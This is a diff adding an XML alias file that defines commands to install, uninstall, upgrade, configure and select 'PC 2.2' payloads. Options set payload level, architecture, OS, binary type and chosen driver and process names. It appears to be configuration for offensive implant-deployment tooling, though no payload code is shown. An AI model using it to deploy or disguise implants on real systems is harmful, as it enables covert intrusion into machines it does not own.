@@ -1,0 +1,130 @@
+<?xml version='1.0' ?>
+
+<Aliases>
+	<Alias>
+		<Name>pc2.2_install</Name>
+		<ReplaceBeforeArgs>script Install/_Pc2.2Install.dss -args "INSTALL </ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc2.2</ReplaceAfterArgs>
+		
+		<Help>pc2.2_install</Help>
+		<Help>    Installs a Level4 PC 2.2 patch 3 payload.</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc2.2_uninstall</Name>
+		<ReplaceBeforeArgs>script Install/_Pc2.2Uninstall.dss -args "</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc2.2</ReplaceAfterArgs>
+		
+		<Help>pc2.2_uninstall</Help>
+		<Help>    Uninstalls a Level4 PC 2.2 patch 3 payload.</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc2.2_upgrade</Name>
+		<ReplaceBeforeArgs>script Install/_Pc2.2Install.dss -args "UPGRADE </ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc2.2</ReplaceAfterArgs>
+		
+		<Help>pc2.2_upgrade</Help>
+		<Help>    Upgrades a Level4 PC to PC 2.2 patch 3 payload.</Help>
+		
+		<Options>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc2.2_prep</Name>
+		<ReplaceBeforeArgs>python Payload/_Pc2.2Prep.py -args "-action configure</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc2.2</ReplaceAfterArgs>
+		
+		<Help>pc2.2_prep</Help>
+		<Help>    Configures a PC payload</Help>
+		<Help></Help>
+		<Help>  [-type &lt;payload_type&gt;]</Help>
+		<Help>     The type of payload (level3, level4)</Help>
+		<Help>  [-arch &lt;arch&gt;]</Help>
+		<Help>     The payload architecture (i386, sparc, ...)</Help>
+		<Help>  [-os &lt;os&gt;]</Help>
+		<Help>     The payload OS (winnt, solaris, ...)</Help>
+		<Help>  [-bintype &lt;type&gt;]</Help>
+		<Help>     The binary type (sharedlib, exe)</Help>
+		<Help>  [-extra &lt;extraInfo&gt;]</Help>
+		<Help>     Extra payload information</Help>
+		<Help>  [-verbose]</Help>
+		<Help>     Print additional information</Help>
+		<Help>  [-utilityburst]</Help>
+		<Help>     Configure with utilityburst support</Help>
+		<Help>  [-driver &lt;name&gt;]</Help>
+		<Help>     Sets the driver name</Help>
+		<Help>  [-process &lt;name&gt;]</Help>
+		<Help>     Sets the process name</Help>
+		<Help>  [-info &lt;name&gt;]</Help>
+		<Help>     Sets the extra info area</Help>
+		<Help>  [-file &lt;file&gt;]</Help>
+		<Help>     The payload file for the -disable option</Help>
+
+		<Options>
+			<Option>type</Option>
+			<Option>arch</Option>
+			<Option>os</Option>
+			<Option>bintype</Option>
+			<Option>extra</Option>
+			<Option>verbose</Option>
+			<Option>utilityburst</Option>
+			<Option>driver</Option>
+			<Option>process</Option>
+			<Option>info</Option>
+		</Options>
+	</Alias>
+	
+	<Alias>
+		<Name>pc2.2_pick</Name>
+		<ReplaceBeforeArgs>python Payload/_Pc2.2Prep.py -args "-action pick</ReplaceBeforeArgs>
+		<ReplaceAfterArgs>" -project Pc2.2</ReplaceAfterArgs>
+		
+		<Help>pc2.2_pick</Help>
+		<Help>    Selects an already configured PC payload</Help>
+		<Help></Help>
+		<Help>  [-type &lt;payload_type&gt;]</Help>
+		<Help>     The type of payload (level3, level4)</Help>
+		<Help>  [-arch &lt;arch&gt;]</Help>
+		<Help>     The payload architecture (i386, sparc, ...)</Help>
+		<Help>  [-os &lt;os&gt;]</Help>
+		<Help>     The payload OS (winnt, solaris, ...)</Help>
+		<Help>  [-bintype &lt;type&gt;]</Help>
+		<Help>     The binary type (sharedlib, exe)</Help>
+		<Help>  [-extra &lt;extraInfo&gt;]</Help>
+		<Help>     Extra payload information</Help>
+		<Help>  [-verbose]</Help>
+		<Help>     Print additional information</Help>
+		<Help>  [-utilityburst]</Help>
+		<Help>     Configure with utilityburst support</Help>
+		<Help>  [-driver &lt;name&gt;]</Help>
+		<Help>     Sets the driver name</Help>
+		<Help>  [-process &lt;name&gt;]</Help>
+		<Help>     Sets the process name</Help>
+		<Help>  [-info &lt;name&gt;]</Help>
+		<Help>     Sets the extra info area</Help>
+		<Help>  [-file &lt;file&gt;]</Help>
+		<Help>     The payload file for the -disable option</Help>
+		
+		<Options>
+			<Option>type</Option>
+			<Option>arch</Option>
+			<Option>os</Option>
+			<Option>bintype</Option>
+			<Option>extra</Option>
+			<Option>verbose</Option>
+			<Option>utilityburst</Option>
+			<Option>driver</Option>
+			<Option>process</Option>
+			<Option>info</Option>
+		</Options>
+	</Alias>
+</Aliases>	
+		
